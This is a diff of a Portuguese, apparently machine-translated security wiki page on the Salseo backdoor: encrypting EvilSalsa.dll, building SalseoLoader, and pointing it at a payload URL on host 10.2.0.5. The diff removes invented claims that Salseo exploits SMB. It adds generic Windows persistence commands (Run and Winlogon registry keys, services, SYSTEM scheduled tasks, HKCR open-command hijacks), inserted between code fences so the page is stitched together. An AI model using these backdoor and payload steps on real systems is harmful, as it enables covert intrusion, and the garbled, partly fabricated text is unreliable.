@@ -37,37 +37,54 @@ Antes de tudo, você precisará codificar o **EvilSalsa.dll**. Para fazer isso, 
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
-### Windows
-
-#### Backdoors
+# Backdoors em Windows
 
 Um backdoor é uma forma de acesso não autorizado a um sistema ou rede, que permite ao invasor contornar as medidas de segurança e obter controle remoto sobre o sistema comprometido. Existem várias técnicas para criar backdoors em sistemas Windows, algumas das quais são discutidas abaixo.
 
-#### Salseo
+## 1. Porta dos fundos do Registro do Windows
 
-O Salseo é uma técnica de backdoor que explora uma vulnerabilidade no serviço de compartilhamento de arquivos do Windows, conhecido como Server Message Block (SMB). Essa técnica permite que um invasor execute comandos arbitrários em um sistema Windows comprometido.
+O Registro do Windows é um banco de dados que armazena configurações e informações importantes do sistema operacional. Um invasor pode criar uma entrada no Registro para executar um programa malicioso sempre que o sistema for iniciado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
 
-##### Configurando o Salseo
+```powershell
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Nome do Programa" /t REG_SZ /d "C:\Caminho\para\programa.exe"
+```
 
-Para configurar o Salseo, siga as etapas abaixo:
+## 2. Backdoor do Serviço do Windows
 
-1. Baixe o arquivo executável do Salseo em um sistema Windows.
-2. Execute o arquivo executável para iniciar o Salseo.
-3. O Salseo solicitará o endereço IP do sistema Windows de destino e as credenciais de autenticação.
-4. Insira o endereço IP do sistema Windows de destino e as credenciais de autenticação quando solicitado.
-5. O Salseo estabelecerá uma conexão com o sistema Windows de destino e fornecerá um prompt de comando remoto.
+Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades específicas para o sistema operacional. Um invasor pode criar um serviço malicioso que seja executado automaticamente quando o sistema é inicializado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
 
-##### Usando o Salseo
+```powershell
+sc create "Nome do Serviço" binPath= "C:\Caminho\para\programa.exe" start= auto
+sc start "Nome do Serviço"
+```
 
-Uma vez configurado o Salseo, você pode usar os seguintes comandos para interagir com o sistema Windows comprometido:
+## 3. Backdoor do Agendador de Tarefas
 
-- `list`: lista os arquivos e diretórios no sistema Windows.
-- `get <arquivo>`: baixa um arquivo específico do sistema Windows.
-- `put <arquivo>`: envia um arquivo para o sistema Windows.
-- `execute <comando>`: executa um comando no sistema Windows.
-- `exit`: encerra a conexão com o sistema Windows comprometido.
+O Agendador de Tarefas do Windows permite que os usuários programem a execução automática de programas ou scripts em horários específicos. Um invasor pode criar uma tarefa agendada para executar um programa malicioso sempre que o sistema é inicializado. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
 
-É importante lembrar que o uso de backdoors é ilegal e viola a privacidade e a segurança dos sistemas. Este conteúdo é fornecido apenas para fins educacionais e de conscientização sobre as técnicas de hacking.
+```powershell
+schtasks /create /tn "Nome da Tarefa" /tr "C:\Caminho\para\programa.exe" /sc onstart /ru "SYSTEM"
+schtasks /run /tn "Nome da Tarefa"
+```
+
+## 4. Backdoor do Shell do Windows
+
+O Shell do Windows é a interface gráfica do usuário que permite aos usuários interagir com o sistema operacional. Um invasor pode modificar as configurações do Shell para executar um programa malicioso sempre que um usuário faz login no sistema. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
+
+```powershell
+reg add HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v "Shell" /t REG_SZ /d "C:\Caminho\para\programa.exe"
+```
+
+## 5. Backdoor do Explorador do Windows
+
+O Explorador do Windows é o gerenciador de arquivos padrão do sistema operacional. Um invasor pode modificar as configurações do Explorador para executar um programa malicioso sempre que um usuário abre uma pasta ou um arquivo específico. Isso permite que o invasor mantenha acesso persistente ao sistema comprometido.
+
+```powershell
+reg add HKCR\Directory\shell\open\command /ve /t REG_SZ /d "C:\Caminho\para\programa.exe"
+reg add HKCR\*\shell\open\command /ve /t REG_SZ /d "C:\Caminho\para\programa.exe"
+```
+
+Essas são apenas algumas das técnicas comuns usadas para criar backdoors em sistemas Windows. É importante estar ciente dessas técnicas para poder proteger seu sistema contra possíveis ataques.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -123,13 +140,13 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
@@ -137,7 +154,7 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 Na pasta do seu projeto, aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
-### **Desinstale** o DllExport
+### **D**esinstale o DllExport
 
 Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
@@ -169,7 +186,7 @@ Selecione a **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Com
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, aparecerá o caminho da nova DLL)
+Para **compilar** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)
 
 ### Teste a DLL gerada
 
@@ -200,11 +217,11 @@ O CMD (Command Prompt) é uma ferramenta de linha de comando no sistema operacio
 
 O CMD pode ser usado para executar comandos básicos, como navegar pelos diretórios, criar e excluir arquivos, gerenciar processos e serviços, configurar redes e muito mais. Além disso, o CMD também pode ser usado para executar scripts e programas.
 
-Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, como explorar vulnerabilidades, obter acesso não autorizado, roubar informações confidenciais e muito mais. Eles podem usar comandos específicos do CMD para realizar essas ações, como criar backdoors, executar scripts maliciosos, modificar configurações do sistema e explorar falhas de segurança.
+Os hackers podem aproveitar o CMD para executar várias atividades maliciosas, como obter informações confidenciais, explorar vulnerabilidades, criar backdoors e realizar ataques de força bruta. Portanto, é importante estar ciente das possíveis ameaças e tomar medidas para proteger seu sistema contra ataques.
 
-É importante que os usuários estejam cientes das possíveis ameaças associadas ao uso do CMD e tomem medidas para proteger seus sistemas contra ataques. Isso inclui manter o sistema operacional e os softwares atualizados, usar senhas fortes, evitar o download de arquivos suspeitos e ter um software antivírus confiável instalado.
+Para evitar o uso indevido do CMD, é recomendável implementar medidas de segurança, como restringir o acesso ao CMD, monitorar atividades suspeitas e manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.
 
-Em resumo, o CMD é uma ferramenta poderosa que pode ser usada para executar várias tarefas no sistema operacional Windows. No entanto, também pode ser explorado por hackers para realizar atividades maliciosas. Portanto, é importante estar ciente das ameaças associadas ao uso do CMD e tomar medidas para proteger os sistemas contra ataques.
+Em resumo, o CMD é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. É essencial entender seu funcionamento e tomar precauções adequadas para garantir a segurança do sistema.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
